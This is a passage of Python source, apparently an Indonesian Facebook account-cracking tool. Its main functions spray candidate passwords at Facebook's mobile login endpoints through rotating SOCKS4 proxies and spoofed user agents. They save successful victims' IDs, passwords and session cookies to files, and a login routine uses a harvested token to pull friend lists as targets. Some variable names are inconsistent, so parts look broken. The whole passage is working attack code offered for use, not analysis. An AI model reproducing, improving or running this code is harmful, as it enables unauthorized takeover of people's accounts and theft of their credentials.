		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1			
def metode10(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mbasic-regular# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			kode = tamsis.get('https://mbasic.facebook.com/login/?email='+idi).text
			data ={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?email='+idi,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			tamsis.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated h2',data=dataa,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode16(idi,sandi):
	global cp,ok,loop
	print(f'\r#Iphone-reguler# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host":"iphone.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://iphone.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			kode = tamsis.get('https://iphone.facebook.com/login/?email='+idi).text
			data ={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			hulu={'Host': 'iphone.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://iphone.facebook.com/login/?email='+idi,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'}
			tamsis.post('https://iphone.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
#def usersc():	
#	
#	cetak(pnl(f""   IP : {ip}
#   ID    : {idlu}
#   Nama : {namalu}
#   TL     : {lahirlu}
#   "",width=90,padding=(0,1),title="| [green]INFO PENGGUNA [cyan]|",style=f"bold cyan"))
def login():
	try:
		cookie = open('cok.txt','r').read()
		tokeeen = open('Token.txt','r').read()
		p = Tamsis(f'https://graph.facebook.com/v16.0/me?fields=friends.limit(5000)&access_token='+tokeeen,cookies={'cookie': cookie}).json()
		try :
			for i in p['error']['message']:
				termux('rm -rf cok.txt')
				termux('rm -rf Token.txt')
				cetak(pnl(f"""Akun Tersebut Tidak Bisa Di Gunakan Untuk Tumbal\nGunakan Akun Fress"""))
				exit()
		except KeyError:
			token.append(tokeeen)
			cok.append(cookie)
	except FileNotFoundError:
		cetak(pnl('Token Dari Kiwi Browser Kadang Gk Bisa'))
		cetak(pnl('Kamu Belum Login'))
		a = input('Masukan Cookie : ')
		b = input('Masukan Token : ')
		p = Tamsis(f'https://graph.facebook.com/v1.0/me?fields=friends.limit(5000)&access_token='+b,cookies={'cookie': a}).json()
		try :
			for i in p['error']['message']:
				cetak(pnl(f"""Akun Tersebut Tidak Bisa Di Gunakan Untuk Tumbal\nGunakan Akun Fress"""))
				exit()
		except:
			open('cok.txt','w').write(a)
			open('Token.txt','w').write(b)
			cok.append(a)
			token.append(b)
login()
termux('clear')
menu()
